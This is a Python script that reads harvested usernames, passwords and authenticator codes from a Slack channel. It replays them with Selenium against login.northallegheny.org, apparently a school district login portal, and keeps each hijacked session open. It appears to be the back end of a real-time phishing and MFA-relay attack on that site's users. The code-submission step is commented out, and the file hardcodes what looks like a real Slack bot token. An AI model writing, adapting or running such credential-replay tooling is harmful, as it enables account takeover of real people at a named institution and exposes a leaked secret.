import time
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys

SLACK_BOT_TOKEN = 'xoxb-2210535565-8957976696580-YK2ru9HTQpTUoMLtMOMGGGCQ'  # <-- Replace with your Slack Bot Token
CHANNEL_ID = 'C08U0JTG9FF'               # <-- Replace with your Slack Channel ID

def get_latest_login_and_code():
    url = 'https://slack.com/api/conversations.history'
    headers = {'Authorization': f'Bearer {SLACK_BOT_TOKEN}'}
    params = {'channel': CHANNEL_ID, 'limit': 10}
    resp = requests.get(url, headers=headers, params=params)
    messages = resp.json().get('messages', [])
    login = password = code = None
    for msg in messages:
        attachments = msg.get('attachments', [])
        if attachments:
            title = attachments[0].get('title', '')
            fields = attachments[0].get('fields', [])
            if 'Login Attempt' in title:
                for field in fields:
                    if field.get('title') == 'Username':
                        login = field.get('value')
                    if field.get('title') == 'Password':
                        password = field.get('value')
            if 'Authenticator Code' in title:
                for field in fields:
                    if field.get('title') == 'Code':
                        code = field.get('value')
        if login and password and code:
            break
    return login, password, code

last_login = None
last_password = None
last_code = None
drivers = []  # Keep track of all open browser windows

while True:
    # Step 1: Wait for username and password
    username, password, _ = get_latest_login_and_code()
    if username and password and (username != last_login or password != last_password):
        print(f"Logging in with: {username} / {password}")
        driver = webdriver.Chrome()
        drivers.append(driver)  # Store the driver so it stays open
        driver.get("https://login.northallegheny.org/")
        time.sleep(10)
        driver.find_element(By.ID, "identification").send_keys(username)
        driver.find_element(By.ID, "ember503").send_keys(password)
        driver.find_element(By.ID, "ember503").send_keys(Keys.RETURN)
        time.sleep(19)
        # Step 2: Wait for a new authenticator code
        print("Waiting for authenticator code from Slack...")
        code = None
        while not code or code == last_code:
            _, _, code = get_latest_login_and_code()
            if code and code != last_code:
                print(f"Received new code: {code}")
                break
            time.sleep(5)

        # Step 3: Enter the authenticator code
        print(f"Entering code: {code}")
        #driver.find_element(By.ID, "ember558").send_keys(code)
        #//driver.find_element(By.ID, "ember558").send_keys(Keys.RETURN)
        print("Login and code submitted. Window will remain open.")
        last_login = username
        last_password = password
        last_code = code

        # Do NOT close the browser window; just continue the loop
    else:
        print("Waiting for new login/password...")
        time.sleep(5)